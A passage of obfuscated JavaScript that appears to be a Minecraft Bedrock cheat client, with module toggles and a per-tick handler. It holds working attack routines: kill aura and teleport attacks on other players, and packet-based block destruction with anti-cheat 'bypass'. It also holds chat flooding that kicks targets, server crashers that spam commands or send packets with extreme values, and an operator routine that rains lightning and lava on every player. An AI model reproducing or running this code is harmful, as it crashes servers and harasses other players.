      messageCreater('已打开玩家列表');
    }
    return;
  }
  for (let Mscrt8755 in Mscrt41254) {
    if (['shortcut', 'value', 'key', 'text', 'fun', 'name']['includes'](Mscrt8755)) continue;
    let Mscrt48428 = Mscrt41254[Mscrt8755];
    if (Mscrt8755.includes('mine:')) {
      let Mscrt8707 = Mscrt8755.replace('mine:', '').split('|');
      if (Mscrt48428) TP_MINER_LIST.push(...Mscrt8707);else {
        for (let Mscrt74906 = TP_MINER_LIST.length - 1; Mscrt74906 >= 0; Mscrt74906--) {
          if (Mscrt8707.includes(TP_MINER_LIST[Mscrt74906])) TP_MINER_LIST.splice(Mscrt74906, 1);
        }
      }
      return;
    }
    if (Mscrt8755.includes('ia_white:')) {
      let Mscrt77870 = Mscrt8755.replace('ia_white:', '');
      if (Mscrt48428) INFINITE_SET.push(Mscrt77870);else if (INFINITE_SET.includes(Mscrt77870)) INFINITE_SET.splice(INFINITE_SET.indexOf(Mscrt77870), 1);
      messageCreater('已添加 ' + Mscrt77870 + ' 至百米白名单');
      return;
    }
    if (Mscrt8755.includes('white:')) {
      let Mscrt46780 = Mscrt8755.replace('white:', '');
      if (Mscrt48428) GLOBE_WHITE.push(Mscrt46780);else if (GLOBE_WHITE.includes(Mscrt46780)) GLOBE_WHITE.splice(GLOBE_WHITE.indexOf(Mscrt46780), 1);
      messageCreater('已添加 ' + Mscrt46780 + ' 至全图攻击白名单');
      return;
    }
    if (Mscrt8755.includes('msg_black:')) {
      let Mscrt55127 = Mscrt8755.replace('msg_black:', '');
      if (Mscrt48428) MSG_WHITE.push(Mscrt55127);else if (MSG_WHITE.includes(Mscrt55127)) MSG_WHITE.splice(MSG_WHITE.indexOf(Mscrt55127), 1);
      messageCreater('已添加 ' + Mscrt55127 + ' 至聊天踢人黑名单');
      return;
    }
    if (Mscrt48428 === globalThis[Mscrt8755] || globalThis[Mscrt8755] === undefined) return;
    if (Mscrt8755 === 'TP_MINER') {
      TP_enable = true;
      TP_states = [false, false];
      TP_pos = myPos;
      TP_timer = 0;
      TP_x = TP_y = TP_z = -TP_MINER_RANGE;
      TP_process = 0;
      TP_MINER_MAX_T = 0;
      TP_MINER_C_DELAY_T = 0;
    }
    if (Mscrt8755 === 'AUTO_TAXI' && Mscrt48428) {
      if (!TAXI_GOAL) {
        showToast('请先设置目标');
        return;
      }
      TAXI_DIST = getDistance(myPos, TAXI_GOAL);
      TAXI_VEC = [(TAXI_GOAL.x - myPos.x) / TAXI_DIST, (TAXI_GOAL.z - myPos.z) / TAXI_DIST];
    }
    if (Mscrt8755 === 'GLOBE_PACKET' && GLOBE_ATTACK) {
      if (Mscrt48428) GLOBE_BACKPOS = myPos;else setEntityPos(myId, GLOBE_BACKPOS.x, GLOBE_BACKPOS.y, GLOBE_BACKPOS.z);
    }
    globalThis[Mscrt8755] = Mscrt48428;
    if (Mscrt8755 === 'TP_MINER_LIST') globalThis[Mscrt8755] = Mscrt48428.split(',');
    if (Mscrt8755 === 'EXEC_CMD_LIST') globalThis[Mscrt8755] = Mscrt48428.split('\n');
    if (Mscrt8755 === 'TAXI_GOAL') {
      pos = Mscrt48428.split(',');
      globalThis[Mscrt8755] = {
        'x': Number(pos[0]),
        'y': Number(pos[1]),
        'z': Number(pos[2])
      };
    }
    if (Mscrt8755 === 'STRUCTURE_LIST') globalThis[Mscrt8755] = Mscrt48428.split(',');
    if (typeof Mscrt48428 === 'boolean') messageCreater('模块 ' + Mscrt8755 + ' - 被' + (Mscrt48428 ? '启用' : '禁用') + '了!');
  }
}
function onTickEvent() {
  myId = getLocalPlayerUniqueID();
  myPos = getEntityPos(myId);
  currentHealth = getEntityAttribute(myId, 'minecraft:health').current;
  if (GLOBE_PACKET) {
    getWorldPlayerList().forEach(Mscrt70650 => {
      if (GLOBE_EXCLUDE && Mscrt70650.id === myId) return;
      sendPlayerPos(Mscrt70650.id);
    });
    if (Object.keys(GLOBE_pos).length > 0 && ticks % GLOBE_DELAY === 0) {
      for (let Mscrt78250 in GLOBE_pos) {
        if (GLOBE_EXCLUDE && Mscrt78250 === myId) continue;
        let Mscrt68157 = GLOBE_pos[Mscrt78250];
        if (!Mscrt68157 || !Mscrt68157.x) continue;
        if (GLOBE_SOUND) sendSound(Number(GLOBE_SOUND_ID), Mscrt68157.x, Mscrt68157.y, Mscrt68157.z, 0);
        if (GLOBE_SHADOW) {
          for (let Mscrt43121 = -GLOBE_SHADOW_RANGE / 2; Mscrt43121 < GLOBE_SHADOW_RANGE / 2; Mscrt43121++) {
            for (let Mscrt34736 = -GLOBE_SHADOW_RANGE / 2; Mscrt34736 < GLOBE_SHADOW_RANGE / 2; Mscrt34736++) {
              for (let Mscrt16622 = -GLOBE_SHADOW_RANGE / 2; Mscrt16622 < GLOBE_SHADOW_RANGE / 2; Mscrt16622++) {
                sendShadow(Mscrt68157.x + Mscrt43121, Mscrt68157.y + Mscrt34736 + GLOBE_SHADOW_OFFSET, Mscrt68157.z + Mscrt16622);
              }
            }
          }
        }
        if (GLOBE_ATTACK) {
          buildBlock(myId, Mscrt68157.x, Mscrt68157.y, Mscrt68157.z, 1);
          silentMove(Mscrt68157.x, Mscrt68157.y, Mscrt68157.z);
          setEntityPos(myId, Mscrt68157.x, Mscrt68157.y, Mscrt68157.z);
          attackEntity(Mscrt78250, true);
        }
      }
    }
  }
  if (INFINITE_PICK) {
    let Mscrt34779 = getEntityList().filter(Mscrt76378 => {
      const Mscrt9695 = getEntityPos(Mscrt76378);
      if (!findEntity(Mscrt76378)) return false;
      if (!Mscrt9695 || !Mscrt9695.x || !Mscrt9695.y || !Mscrt9695.z) return false;
      let Mscrt28941 = getEntityNamespace(Mscrt76378) === 'minecraft:item' || getEntityNamespace(Mscrt76378) === 'minecraft:xp_orb';
      let {
        x,
        y,
        z
      } = Mscrt9695;
      let Mscrt32254 = Math.hypot(Mscrt9695.x - myPos.x, Mscrt9695.y - myPos.y, Mscrt9695.z - myPos.z);
      return Mscrt28941 && Mscrt32254 < INFINITE_PICK_RANGE;
    });
    Mscrt34779.sort((Mscrt22626, Mscrt6880) => {
      const Mscrt6687 = getEntityPos(Mscrt22626);
      const Mscrt65705 = getEntityPos(Mscrt6880);
      return Math.hypot(Mscrt6687.x - myPos.x, Mscrt6687.y - myPos.y, Mscrt6687.z - myPos.z) - Math.hypot(Mscrt65705.x - myPos.x, Mscrt65705.y - myPos.y, Mscrt65705.z - myPos.z);
    });
    for (let Mscrt83317 = 0; Mscrt83317 < Math.min(INFINITE_PICK_MAX, Mscrt34779.length); Mscrt83317++) {
      let {
        x,
        y,
        z
      } = getEntityPos(Mscrt34779[Mscrt83317]);
      silentMove(x, y, z);
    }
    tipCreater('收集速度:' + INFINITE_PICK_MAX + ' 剩余:' + Mscrt34779.length + '个掉落物');
  }
  if (AUTO_DESTROY && ticks % AUTO_DESTROY_DELAY === 0) {
    for (let Mscrt13916 = -AUTO_DESTROY_RANGE / 2; Mscrt13916 < AUTO_DESTROY_RANGE / 2; Mscrt13916++) {
      for (let Mscrt32494 = -AUTO_DESTROY_RANGE / 2; Mscrt32494 < AUTO_DESTROY_RANGE / 2; Mscrt32494++) {
        for (let Mscrt69927 = -AUTO_DESTROY_RANGE / 2; Mscrt69927 < AUTO_DESTROY_RANGE / 2; Mscrt69927++) {
          let Mscrt26169 = {
            'x': Math.floor(myPos.x + Mscrt13916),
            'y': Math.floor(myPos.y + Mscrt32494 - 2),
            'z': Math.floor(myPos.z + Mscrt69927)
          };
          if (AUTO_DESTROY_EXCLUDE && Mscrt26169.y < myPos.y) continue;
          destroyBlock(myId, Mscrt26169.x, Mscrt26169.y, Mscrt26169.z, 0);
        }
      }
    }
  }
  if (AUTO_DESTROY && AUTO_DESTROY_IGNORE) getEntityList().forEach(Mscrt75641 => {
    if (getEntityNamespace(Mscrt75641) === 'minecraft:item') removeEntity(Mscrt75641);
  });
  if (ENCHANT_CRASHER) {
    if (getEntityCarriedItem(myId).includes('minecraft:air')) callModule(3, JSON.stringify({
      'fn-set-item': []
    }));else tipCreater('请选择空气物品');
  }
  if (INFINITE_AURA) {
    let Mscrt50818 = Math.round(20 / INFINITE_CPS);
    let Mscrt8542 = getPlayerList();
    Mscrt8542 = Mscrt8542.slice(0, Math.min(Mscrt8542.length, INFINITE_COUNT));
    if (INFINITE_tick === 0) Mscrt8542.forEach(Mscrt3819 => {
      if (Mscrt3819 === myId || INFINITE_SET.includes(Mscrt3819)) return;
      let Mscrt77973 = getEntityPos(Mscrt3819);
      buildBlock(myId, Mscrt77973.x, Mscrt77973.y, Mscrt77973.z, 1);
      setEntityPos(myId, Mscrt77973.x, Mscrt77973.y, Mscrt77973.z);
      silentMove(Mscrt77973.x, Mscrt77973.y, Mscrt77973.z);
      attackEntity(Mscrt3819, true);
      INFINITE_tmpMot = getEntityMotion(myId);
      INFINITE_tmpPos = myPos;
    });
    if (INFINITE_tick < 0 && INFINITE_tmpPos) {
      buildBlock(myId, INFINITE_tmpPos.x, INFINITE_tmpPos.y, INFINITE_tmpPos.z, 1);
      silentMove(INFINITE_tmpPos.x, INFINITE_tmpPos.y, INFINITE_tmpPos.z);
      setEntityPos(myId, INFINITE_tmpPos.x, INFINITE_tmpPos.y, INFINITE_tmpPos.z);
      setEntityMotion(myId, INFINITE_tmpMot.x, INFINITE_tmpMot.y, INFINITE_tmpMot.z);
      INFINITE_tick = Mscrt50818;
    }
    INFINITE_tick--;
  }
  if (MSG_BOOMER && MSG_WHITE.length > 0) {
    MSG_WHITE.forEach(Mscrt43113 => {
      for (let Mscrt86217 = 0; Mscrt86217 < MSG_NUM; Mscrt86217++) executeCommand('tell @a[name="' + getEntityName(Mscrt43113) + '"] \n\n\n\n\n\n\n\n\n\n\n\n\n\n §r§f' + MSG_FAKE + ' ' + MSG_TEXT);
    });
  }
  if (SPAMMER) {
    for (let Mscrt27683 = 0; Mscrt27683 < SPAMMER_NUM; Mscrt27683++) {
      if (SPAMMER_FAKE) executeCommand('tell @a \n\n\n\n\n\n\n\n\n\n\n\n\n\n §r§f' + SPAMMER_FAKE_TEXT + ' ' + SPAMMER_TEXT);else sendChatMessage(SPAMMER_TEXT);
    }
  }
  if (TP_MINER && TP_MINER_REPEAT && ticks % TP_MINER_DELAY === 0 && (TP_states[1] || TP_MINER_CHEST && TP_states[0]) && !TP_enable) {
    TP_enable = true;
    TP_states = [false, false];
    TP_timer = 0;
    TP_pos = myPos;
    TP_x = TP_y = TP_z = -TP_MINER_RANGE;
    let Mscrt72408 = getRand(-TP_MINER_RANGE, TP_MINER_RANGE);
    if (TP_MINER_TP) setEntityPos(myId, myPos.x + Mscrt72408, myPos.y, myPos.z + Mscrt72408);
    TP_process = 0;
    TP_MINER_MAX_T = 0;
    TP_MINER_C_DELAY_T = 0;
    messageCreater('循环搜索中');
  }
  if (TP_MINER && TP_enable) {
    if (TP_MINER_DESTROY) TP_MINER_MAX_T++;
    if (TP_MINER_CHEST_S) TP_MINER_C_DELAY_T++;
    if (TP_states[0] && getEntityList()) {
      let Mscrt16357 = getEntityList().filter(Mscrt55470 => {
        const Mscrt87051 = getEntityPos(Mscrt55470);
        if (!findEntity(Mscrt55470)) return false;
        if (!Mscrt87051 || !Mscrt87051.x || !Mscrt87051.y || !Mscrt87051.z) return false;
        let Mscrt52009 = getEntityNamespace(Mscrt55470) === 'minecraft:item';
        let {
          x,
          y,
          z
        } = Mscrt87051;
        let Mscrt79016 = x < TP_MINER_RANGE + TP_pos.x + TP_MINER_OFFSET && x > -TP_MINER_RANGE + TP_pos.x - TP_MINER_OFFSET && y < TP_MINER_RANGE + TP_pos.y + TP_MINER_OFFSET && y > -TP_MINER_RANGE + TP_pos.y - TP_MINER_OFFSET && z < TP_MINER_RANGE + TP_pos.z + TP_MINER_OFFSET && z > -TP_MINER_RANGE + TP_pos.z - TP_MINER_OFFSET;
        return Mscrt52009 && Mscrt79016;
      });
      Mscrt16357.sort((Mscrt34970, Mscrt40951) => {
        const Mscrt81092 = getEntityPos(Mscrt34970);
        const Mscrt86160 = getEntityPos(Mscrt40951);
        return Math.hypot(Mscrt81092.x - myPos.x, Mscrt81092.y - myPos.y, Mscrt81092.z - myPos.z) - Math.hypot(Mscrt86160.x - myPos.x, Mscrt86160.y - myPos.y, Mscrt86160.z - myPos.z);
      });
      if (Mscrt16357.length === 0) {
        messageCreater('收集完成');
        TP_states[1] = true;
        TP_enable = false;
      } else {
        for (let Mscrt69218 = 0; Mscrt69218 < Math.min(TP_MINER_PICK, Mscrt16357.length); Mscrt69218++) {
          let {
            x,
            y,
            z
          } = getEntityPos(Mscrt16357[Mscrt69218]);
          silentMove(x, y, z);
        }
        tipCreater('收集速度:' + TP_MINER_PICK + ' 剩余:' + Mscrt16357.length + '个掉落物');
      }
      TP_timer++;
      if (TP_timer > TP_MINER_TIMEOUT * 20) {
        messageCreater('收集超时 自动暂停');
        TP_states[1] = true;
        TP_enable = false;
      }
    } else if (TP_MINER_AUTO) {
      const Mscrt21992 = getEntityCarriedItem(myId);
      if (!Mscrt21992.includes('_pickaxe')) {
        for (let Mscrt81615 = 0; Mscrt81615 < 9; Mscrt81615++) {
          const Mscrt1405 = getPlayerInventoryItem(myId, Mscrt81615);
          if (Mscrt1405.includes('_pickaxe')) {
            selectPlayerInventorySlot(myId, Mscrt81615);
            break;
          }
        }
      }
    }
    for (let Mscrt69032 = 0; Mscrt69032 < TP_MINER_SEARCH; Mscrt69032++) {
      if (TP_states[0]) break;
      let Mscrt4608 = TP_x;
      let Mscrt41751 = TP_y;
      let Mscrt56059 = TP_z;
      let Mscrt35248 = Math.floor(Mscrt4608 + TP_pos.x),
        Mscrt84566 = Math.floor(Mscrt41751 + TP_pos.y),
        Mscrt60279 = Math.floor(Mscrt56059 + TP_pos.z);
      let Mscrt2910 = getBlock(Mscrt35248, Mscrt84566, Mscrt60279);
      if (TP_MINER_DESTROY) {
        if (ticks % TP_MINER_RETRY === 0) packetDestroy(Mscrt35248, Mscrt84566, Mscrt60279, true, true, TP_MINER_BYPASS || TP_MINER_INSTANT);
        let Mscrt51290 = getBlock(Mscrt35248, Mscrt84566, Mscrt60279);
        tipCreater('正在挖掘中');
        if (Mscrt51290.namespace === 'minecraft:air') {
          TP_MINER_MAX_T = 0;
          setTimeout(() => TP_MINER_DESTROY = false, TP_MINER_NEXT * 50);
        }
        if (TP_MINER_MAX_T > TP_MINER_MAX) {
          TP_MINER_DESTROY = false;
          messageCreater('挖掘超时 已切换下一个方块');
          TP_MINER_MAX_T = 0;
          TP_x++;
        }
        break;
      }
      if (TP_MINER_CHEST_S) {
        silentMove(Mscrt35248, Mscrt84566, Mscrt60279);
        if (getScreenName() === 'hud_screen') buildBlock(myId, Mscrt35248, Mscrt84566, Mscrt60279, 0);
        tipCreater('正在搜索物资中');
        if (TP_MINER_C_DELAY_T > TP_MINER_C_DELAY) {
          TP_MINER_CHEST_S = false;
          TP_MINER_C_DELAY_T = 0;
          deleteContainer();
          TP_x++;
        }
        break;
      }
      if (TP_MINER_CHEST && TP_MINER_LIST.some(Mscrt10947 => Mscrt2910.namespace.includes(Mscrt10947)) && !TP_MINER_CHEST_S) {
        TP_MINER_CHEST_S = true;
        break;
      }
      if (TP_MINER_HAND && TP_MINER_LIST.some(Mscrt88596 => Mscrt2910.namespace.includes(Mscrt88596)) && !TP_MINER_DESTROY) {
        setEntityPos(myId, Mscrt35248, Mscrt84566 + 3, Mscrt60279);
        packetDestroy(Mscrt35248, Mscrt84566, Mscrt60279, true, true, TP_MINER_INSTANT);
        TP_MINER_DESTROY = true;
        break;
      }
      if (!TP_MINER_HAND && TP_MINER_LIST.some(Mscrt37838 => Mscrt2910.namespace.includes(Mscrt37838))) {
        silentMove(Mscrt35248, Mscrt84566, Mscrt60279);
        if (TP_MINER_BYPASS) {
          packetDestroy(Mscrt35248, Mscrt84566, Mscrt60279, true, true, true);
          TP_MINER_DESTROY = true;
          break;
        } else destroyBlock(myId, Mscrt35248, Mscrt84566, Mscrt60279, 0);
      }
      tipCreater('扫描: [' + Mscrt35248 + ', ' + Mscrt84566 + ', ' + Mscrt60279 + '] - 方块:' + Mscrt2910.namespace.replace('minecraft:', '') + ' \n进度: ' + TP_process + '/' + 8 * (TP_MINER_RANGE + 1) * (TP_MINER_RANGE + 1) * (TP_MINER_RANGE + 1));
      TP_x++;
      if (TP_x > TP_MINER_RANGE) {
        TP_y++;
        TP_x = -TP_MINER_RANGE;
      }
      if (TP_y > TP_MINER_RANGE) {
        TP_z++;
        TP_y = -TP_MINER_RANGE;
      }
      if (TP_z > TP_MINER_RANGE) {
        TP_states[0] = true;
        messageCreater('扫描结束 开始收集');
      }
      TP_process++;
    }
  }
  if (TP_MINER && TP_MINER_ANTI) destroyBlock(myId, myPos.x, myPos.y, myPos.z, 0);
  if (TAXI_GOAL && AUTO_TAXI && TAXI_VEC) {
    const Mscrt53403 = Math.sqrt((TAXI_GOAL.x - myPos.x) ** 2 + (TAXI_GOAL.z - myPos.z) ** 2);
    if (Mscrt53403 > TAXI_SPEED * 1.1) {
      if (Math.abs(myPos.y - TAXI_HEIGHT) > 2) MenuTP(myPos.x, myPos.y + (myPos.y - TAXI_HEIGHT >= 0 ? -1 : 1), myPos.z);else MenuTP(myPos.x + TAXI_VEC[0] * TAXI_SPEED, myPos.y, myPos.z + TAXI_VEC[1] * TAXI_SPEED);
    } else if (Math.abs(myPos.y - TAXI_GOAL.y) > 2) MenuTP(myPos.x, myPos.y + (myPos.y - TAXI_GOAL.y >= 0 ? -1 : 1), myPos.z);else {
      messageCreater('已到达目的，欢迎下次乘车');
      TAXI_GOAL = null;
    }
  }
  if (EXEC_CMD && ticks % EXEC_CMD_DELAY == 0) {
    for (let Mscrt76228 = 0; Mscrt76228 < EXEC_CMD_TIMES; Mscrt76228++) EXEC_CMD_LIST.forEach(Mscrt17872 => sendCommandRequest(Mscrt17872));
  }
  if (GODMODE) {
    for (let Mscrt11219 = 0; Mscrt11219 < GODMODE_FRE; Mscrt11219++) silentMove(myPos.x, GODMODE_RAND ? getRand(-70, GODMODE_RANGE) : GODMODE_Y, myPos.z, {
      'x': 0,
      'y': 0.1,
      'z': 0
    });
  }
  if (KILLAURA) {
    let Mscrt32771 = [];
    if (KILLAURA_SELF) Mscrt32771.push(myId);
    let Mscrt31358 = getPlayerList();
    Mscrt31358.splice(Mscrt31358.indexOf(myId), 1);
    if (KILLAURA_TARGET) Mscrt32771.push(...Mscrt31358);
    if (Mscrt32771.length > 0) {
      Mscrt32771 = Mscrt32771.slice(0, Math.min(KILLAURA_COUNT, Mscrt32771.length));
      Mscrt32771.forEach(Mscrt72591 => attackEntity(Mscrt72591, true));
    }
  }
  if (BREAK_SHIELD) {
    getPlayerList().forEach(Mscrt54134 => {
      if (!getEntityFlag(Mscrt54134, 1)) return;
      const Mscrt22041 = getEntityCarriedItem(Mscrt54134);
      const Mscrt87255 = getEntityOffhandItem(Mscrt54134);
      if (Mscrt87255.includes('shield') || Mscrt22041.includes('shield')) {
        for (let Mscrt47874 = 0; Mscrt47874 < 50; Mscrt47874++) attackEntity(Mscrt54134, false);
      }
    });
  }
  if (AUTOBACK && currentHealth <= BACK_MIN && BACK_SET) silentMove(BACK_SET.x, BACK_SET.y, BACK_SET.z);
  if (LOCAL_RESPAWN) {
    if (currentHealth - prevHealth > 8) {
      setEntityPos(myId, prevPos.x, prevPos.y, prevPos.z);
      messageCreater('已传送至死亡点');
    }
    prevPos = myPos;
    prevHealth = currentHealth;
  }
  if (BUILD_TASKS.length > 0 && ticks % IMPORT_DELAY === 0 && IS_SUMMON) {
    const Mscrt73610 = Math.min(BUILD_TASKS.length, IMPORT_SPEED);
    for (let Mscrt62198 = 0; Mscrt62198 < Mscrt73610; Mscrt62198++) {
      const Mscrt68374 = BUILD_TASKS.shift();
      if (typeof Mscrt68374 === 'object') {
        const {
          x,
          y,
          z,
          name,
          aux
        } = Mscrt68374;
        const {
          x: Mscrt50009,
          y: Mscrt51670,
          z: Mscrt7193
        } = POS_DATA;
        if (Mscrt68374.cmd) CMD_TASKS.push(Mscrt68374.cmd);
        let Mscrt3472 = [x + Mscrt50009, y + Mscrt51670, z + Mscrt7193];
        executeCommand('execute as @e[type=armor_stand,name="CookieBox"] at @s run tp ~' + (Mscrt3472[0] - CURRENT_POS[0]) + ' ~' + (Mscrt3472[1] - CURRENT_POS[1]) + ' ~' + (Mscrt3472[2] - CURRENT_POS[2]));
        executeCommand('execute as @e[type=armor_stand,name="CookieBox"] at @s run setblock ~~~ ' + name + ' ' + aux);
        CURRENT_POS = Mscrt3472;
      } else {
        break;
      }
    }
    tipCreater('当前任务剩余: ' + BUILD_TASKS.length);
  }
  if (BUILD_TASKS.length === 0 && CMD_TASKS.length > 0) {
    const Mscrt44133 = Math.min(CMD_TASKS.length, 5);
    for (let Mscrt30760 = 0; Mscrt30760 < Mscrt44133; Mscrt30760++) {
      const Mscrt9934 = CMD_TASKS.shift();
      if (typeof Mscrt9934 === 'object') {
        let Mscrt17671 = {
          'mode': Mscrt9934.cmd.mode,
          'isRedStoneMode': !Mscrt9934.cmd.auto,
          'isConditional': Mscrt9934.cmd.condition,
          'command': Mscrt9934.cmd.cmd,
          'name': Mscrt9934.cmd.name,
          'tickDelay': Mscrt9934.cmd.delay,
          'executeOnFirstTick': false,
          'shouldTrackOutput': false,
          'lastOutput': 'CookieBox'
        };
        setCommandBlockData(Mscrt9934.x, Mscrt9934.y, Mscrt9934.z, Mscrt17671);
      } else break;
    }
    tipCreater('设置命令剩余: ' + BUILD_TASKS.length);
  }
  if (OP_SWITCH) {
    if (OP_TICKS < OP_CMDS.length && OP_CMDS[OP_TICKS] != null) {
      executeCommand(OP_CMDS[OP_TICKS]);
      OP_TICKS++;
    } else if (OP_DELAY2 >= OP_DELAY) {
      if (OP_CUSTOM) {
        let Mscrt49659 = getRandColor(OP_COLORS) + OP_CONTENT;
        let Mscrt77524 = getRandColor(OP_COLORS) + OP_TITLE;
        let Mscrt4651 = getRandColor(OP_COLORS) + OP_SCORE + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10);
        executeCommand('/title @a title ' + Mscrt77524);
        executeCommand('/title @a subtitle ' + Mscrt77524);
        executeCommand('/title @a actionbar ' + Mscrt77524);
        executeCommand('/scoreboard players add ' + Mscrt4651 + ' crash_op ' + OP_TICKS3);
        executeCommand('/tellraw @a {"rawtext":[{"text":"' + Mscrt49659 + '"}]}');
        executeCommand('/execute as @a[rm=0.1] at @s run summon lightning_bolt');
        executeCommand('/execute as @a[rm=0.1] at @s run fill ~5~5~5 ~-5~~-5 lava');
        OP_TICKS3++;
      } else {
        executeCommand('/title @a title ' + OP_TEXTS[OP_TICKS2]);
        executeCommand('/title @a subtitle ' + OP_TEXTS[OP_TICKS2]);
        executeCommand('/title @a actionbar ' + OP_TEXTS[OP_TICKS2]);
        let Mscrt28143 = OP_TEXTS[OP_TICKS2] + OP_TEXTS[OP_TICKS2] + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10) + Math.ceil(Math.random() * 10);
        executeCommand('/scoreboard players add ' + Mscrt28143 + ' crash_op ' + OP_TICKS3);
        executeCommand('/tellraw @a {"rawtext":[{"text":"' + OP_TEXTS[OP_TICKS2] + '"}]}');
        executeCommand('/execute as @a[rm=0.1] at @s run summon lightning_bolt');
        executeCommand('/execute as @a[rm=0.1] at @s run fill ~5~5~5 ~-5~~-5 lava');
        OP_TICKS2++;
        OP_TICKS3++;
      }
      OP_DELAY2 = -1;
      if (OP_BOOST) {
        if (OP_TICKS4 < OP_CMDS2.length && OP_CMDS2[OP_TICKS4] != null) {
          executeCommand(OP_CMDS2[OP_TICKS4]);
          executeCommand('/effect @e[type=iron_golem] Resistance 999999 255 true');
          OP_TICKS4++;
        }
        if (OP_CMDS2[OP_TICKS4] == null) {
          executeCommand('/execute as @e[type=iron_golem] at @s run summon lightning_bolt');
          executeCommand('/execute as @e[type=iron_golem] at @s run fill ~5~5~5 ~-5~1~-5 lava');
        }
      }
    }
    OP_DELAY2++;
    if (OP_TEXTS[OP_TICKS2] == null) OP_TICKS2 = 0;
    if (OP_CRASH) executeCommand('/summon Ender_Dragon ~~30~');
  }
  if (CRASHER_NEW) {
    for (let Mscrt77715 = 0; Mscrt77715 < CRASHER_NEW_RATE; Mscrt77715++) sendCommandRequest('/me @a');
  }
  if (CRASHER) {
    for (let Mscrt69773 = 0; Mscrt69773 < CRASHER_RATE; Mscrt69773++) sendCommandRequest('/w 你好 再见');
  }
  if (CRASHER_AUTH) {
    for (let Mscrt43168 = 0; Mscrt43168 < CRASHER_AUTH_RATE; Mscrt43168++) sendPlayerAuthInput({
      'pos': {
        'x': 1000000000,
        'y': 1000000000,
        'z': 1000000000
      },
      'yHeadRot': 1000000000,
      'inputMode': 1000000000,
      'playMode': 1000000000,
      'flags': [Mscrt43168],
      'motion': {
        'x': 1000000000,
        'y': 1000000000,
        'z': 1000000000
      },
      'rot': {
        'yaw': 1000000000,
        'pitch': 1000000000
      }
    });
  }
  if (KICKAURA) {
    for (let Mscrt67979 = 0; Mscrt67979 < KICKAURA_RATE; Mscrt67979++) sendCommandRequest('/w @a[rm=0.1] \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n');
  }
  if (CRITICAL) {
    for (let Mscrt51191 = 0; Mscrt51191 < 5; Mscrt51191++) silentMove(myPos.x, myPos.y + 100, myPos.z, {
      'x': 0,
      'y': -100,
      'z': 0
    });
  }
  setBooleanOption(327, {
    'value': SHOW_CHUNK,
    'defaultValue': false
  });
  ticks++;
  if (AUTO_CONNECT) AUTO_CONNECT_TICK++;
  if (AUTO_CONNECT_TICK > AUTO_CONNECT_DELAY && AUTO_CONNECT_ADDR) executeCommand('/ww server ' + AUTO_CONNECT_ADDR.replace(':', ' '));
}
function onCommandOutputEvent(Mscrt31547, Mscrt33067, Mscrt38022) {
  if (KICKAURA) return true;
  if (CRASHER_NEW) return true;
  if (CRASHER) return true;
  if (OP_SWITCH) return true;
  if (MSG_BOOMER) return true;
  return BUILD_TASKS.length > 0;
}
function onPlayerBuildBlockEvent(Mscrt43397, Mscrt15489, Mscrt71013, Mscrt68727, Mscrt3603) {
  const Mscrt67439 = getBlock(Mscrt15489, Mscrt71013, Mscrt15489);
  if (IMPORT_POS) {
    POS_DATA = {
      'x': Mscrt15489,
      'y': Mscrt71013,
      'z': Mscrt68727
    };
    messageCreater('已设置导入坐标');
    return true;
  }
  if (CLICKDESTROY) packetDestroy(Mscrt15489, Mscrt71013, Mscrt68727, true, true, true);
  if (GODMODE && GODMODE_INTERACT) {
    for (let Mscrt20354 = 0; Mscrt20354 < GODMODE_FRE; Mscrt20354++) silentMove(Mscrt15489, Mscrt71013, Mscrt68727);
  }
  if (GET_COMMAND && Mscrt67439.namespace.includes('command_block')) {
    let Mscrt49407 = getBlockEntityNBT(Mscrt15489, Mscrt71013, Mscrt68727);
    let Mscrt34422 = getText(Mscrt49407, 'Command:"', '",Cu');
    let Mscrt31362 = getText(Mscrt49407, 'auto:', 'b,c') === '1' ? '是' : '否';
    let Mscrt68659 = getText(Mscrt49407, 'TickDelay:', ',Tr');
    let Mscrt59344 = {
      '坐标': {
        'x': Mscrt15489,
        'y': Mscrt71013,
        'z': Mscrt68727
      },
      '指令': Mscrt34422,
      '无需红石': Mscrt31362,
      '延迟': Mscrt68659
    };
    messageCreater('命令方块数据: ' + JSON.stringify(Mscrt59344, null, 2));
    return true;
  }
  if (EXPORT_POS) {
    if (POS_DATA.x === 0 && POS_DATA.y === 0 && POS_DATA.z === 0) {
      POS_DATA.x = Mscrt15489;
      POS_DATA.y = Mscrt71013;
      POS_DATA.z = Mscrt68727;
      messageCreater('已经选择起点，请选择终点');
    } else {
      const Mscrt73344 = getChunkBlocks(POS_DATA.x, POS_DATA.y, POS_DATA.z, Mscrt15489, Mscrt71013, Mscrt68727);
      const Mscrt58375 = new Date();
      const Mscrt78475 = Mscrt58375.getTime().toString();
      addForm('{"type":"custom_form","title":"输入保存名称","content":[{"type":"input","text":"名称:","default":"' + Mscrt78475 + '"}]}', (Mscrt75778) => {
        if (typeof Mscrt75778 == 'string' && Mscrt75778.length > 0) {
          saveBlocksData(Mscrt75778, Mscrt73344);
          messageCreater('保存成功');
        } else {
          messageCreater('未保存');
        }
      }, () => {
        messageCreater('未选择保存');
      });
      POS_DATA.x = 0;
      POS_DATA.y = 0;
      POS_DATA.z = 0;
      EXPORT_POS = false;
    }
    return true;
  }
}
function onReadyEvent() {
  if (ENTER_TEXT) {
    for (let Mscrt31430 = 0; Mscrt31430 < ENTER_TEXT_TIMES; Mscrt31430++) sendChatMessage(ENTER_TEXT_CONTENT);
  }
}
function onClientMessageEvent(Mscrt75443, Mscrt23023) {
  if (FAKE_IRC) {
